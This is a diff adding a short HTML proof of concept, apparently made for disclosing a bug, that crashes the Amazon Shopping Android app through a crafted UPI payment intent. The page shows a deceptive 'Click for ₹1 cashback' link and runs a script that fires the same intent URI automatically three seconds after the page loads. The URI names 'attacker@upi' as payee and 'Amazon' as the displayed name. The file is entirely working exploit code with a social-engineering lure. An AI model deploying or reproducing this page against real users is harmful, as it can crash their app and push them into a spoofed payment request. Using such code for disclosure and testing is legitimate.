@@ -1,0 +1,23 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Amazon UPI Crash PoC</title>
+  </head>
+  <body>
+    <h1>Amazon Shopping UPI Crash PoC</h1>
+
+    <p>
+      <a href='intent://pay?pa=attacker@upi&pn=Amazon&am=1&cu=INR#Intent;scheme=upi;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;end'>
+        Click for ₹1 cashback
+      </a>
+    </p>
+
+    <script>
+      // Optional auto-fire after 3 seconds
+      setTimeout(function () {
+        location.href =
+          'intent://pay?pa=attacker@upi&pn=Amazon&am=1&cu=INR#Intent;scheme=upi;package=in.amazon.mShop.android.shopping;S.UseCase=UPIIntent;end';
+      }, 3000);
+    </script>
+  </body>
+</html>
